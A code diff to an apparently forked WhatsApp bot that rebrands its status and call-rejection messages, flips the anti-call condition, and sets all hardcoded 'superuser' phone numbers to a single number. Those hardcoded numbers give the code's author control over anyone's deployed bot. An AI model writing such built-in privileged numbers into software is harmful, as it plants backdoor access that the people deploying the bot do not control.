@@ -131,7 +131,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `CRISS MD BOT is online!\n${currentDateTime}`; // Format the bio text
+        const bioText = `CRISS VEVO is online!\n${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -140,13 +140,13 @@ setInterval(async () => {
 // Function to handle deleted messages
 // Other functions (auto-react, anti-delete, etc.) as needed
         zk.ev.on("call", async (callData) => {
-  if (conf.ANTICALL === 'no') {
+  if (conf.ANTICALL === 'yes') {
     const callId = callData[0].id;
     const callerId = callData[0].from;
 
     await zk.rejectCall(callId, callerId);
     await zk.sendMessage(callerId, {
-      text: "Am Criss Md Bot,, My owner is unavailable try again later"
+      text: "Am bmb md,, My owner is unavailable try again later"
     });
   }
 });
@@ -248,8 +248,8 @@ if (conf.AUTO_REACT_STATUS === "yes") {
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
             const dj = '254710772666';
-            const dj2 = '254759328581';
-            const dj3 = "254737681758";
+            const dj2 = '254710772666';
+            const dj3 = "254710772666";
             const luffy = '254710772666';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
